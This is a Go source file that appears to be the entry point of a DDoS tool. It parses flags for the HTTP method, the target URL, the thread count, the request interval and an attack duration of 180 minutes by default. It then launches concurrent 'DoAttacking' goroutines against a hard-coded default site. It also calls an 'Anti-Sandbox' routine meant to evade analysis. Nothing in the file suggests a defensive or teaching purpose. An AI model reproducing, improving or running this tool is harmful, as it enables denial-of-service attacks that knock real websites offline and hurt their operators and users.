package main

import (
	"flag"
	"log"
	"os"
	"runtime"
	"time"
)

// X args
var (
	AppName   string
	BuiltAt   string
	GoVersion string
	GitAuthor string
	GitCommit string
	Version   string = "dev"
)

// Main Function / 主函数
func main() {
	protectMain() // Anti-Sandbox
	defaultTargetUrl := "https://rete.fun/"
	runtime.GC() // Clean up memory to prevent memory overflow
	// Parse Flags / 解析命令行参数
	printVersion := flag.Bool("v", false, "Print version and exit")
	flag.StringVar(&Method, "m", "GET", "DDoS Method(GET/POST/PUT/HEAD/...)")
	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "Taget URL")
	flag.IntVar(&ConcurrencyCount, "cc", 100, "Number of concurrent threads")
	flag.IntVar(&IntervalMillisecond, "ims", 100, "Frequency of attacks per thread(ms)")
	flag.IntVar(&DurationMinute, "dm", 180, "Attack Duration time(Minutes)")
	flag.Parse()
	if *printVersion {
		printVer()
		os.Exit(0)
	} else {
		printWelcome()
	}
	if TargetUrl == defaultTargetUrl {
		log.Printf("You have not specified a destination address! Default is %s.\n", TargetUrl)
	}
	go func() {
		for i := 0; i < ConcurrencyCount; i++ {
			go DoAttacking(i)
		}
	}()
	time.Sleep(time.Duration(DurationMinute) * time.Minute)
	os.Exit(0) // Exit with code 0
}
